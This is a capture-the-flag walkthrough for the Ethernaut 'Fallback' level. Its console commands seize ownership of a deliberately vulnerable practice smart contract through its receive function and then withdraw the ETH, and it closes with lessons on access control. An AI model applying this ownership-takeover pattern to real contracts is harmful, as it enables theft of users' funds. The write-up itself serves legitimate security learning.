# Fallback

## Objective

Exploit the fallback function vulnerability in the provided smart contract to become the contract owner and withdraw its ETH balance.

---

## Getting Started

1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Fallback"** level
3. Click **“Get new instance”** and approve the transaction in MetaMask
4. The instance is now deployed and available as the `contract` object in the browser console
5. Save the instance address:

    ```js
    contract.address
    ```

---

## Walkthrough

### Step 1: Check the Current Owner

```js
await contract.owner()
```

**Explanation:**
This checks the current owner of the contract. Initially, it will not be your address.

---

### Step 2: Make a Small Contribution

```js
await contract.contribute({ value: "1" }) // 1 wei is enough
```

**Explanation:**
This registers your address with a nonzero contribution, which is required to exploit the fallback logic.

---

### Step 3: Trigger the Fallback Function

```js
await contract.sendTransaction({ value: "1" })
```

**Explanation:**
This sends ETH directly to the contract, invoking the `receive()` function. Since you have a contribution, this sets you as the new owner.

---

### Step 4: Confirm Ownership

```js
await contract.owner()
```

**Explanation:**
Verifies that you are now the contract owner after exploiting the fallback logic.

---

### Step 5: Withdraw All ETH

```js
await contract.withdraw()
```

**Explanation:**
As the new owner, you can now withdraw the contract's entire ETH balance.

---

### Step 6: Submit the Level

Click **“Submit instance”** in the UI and confirm the MetaMask transaction. The level is complete once the transaction is successful.

---

## What You Learn

This level teaches the following:

* How fallback and receive functions can be abused if not properly secured
* The importance of validating contribution logic and access control
* How ownership can be unintentionally transferred through fallback logic
* Defensive patterns to prevent unauthorized ownership changes

---

## Resources Used

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs](https://docs.soliditylang.org/)
* [YouTube Walkthrough](https://www.youtube.com/watch?v=TQKj2xvsGec)
* [Blog Writeup](https://shubhamm.me/blog/08-ethernaut-challenges-fallback)

---
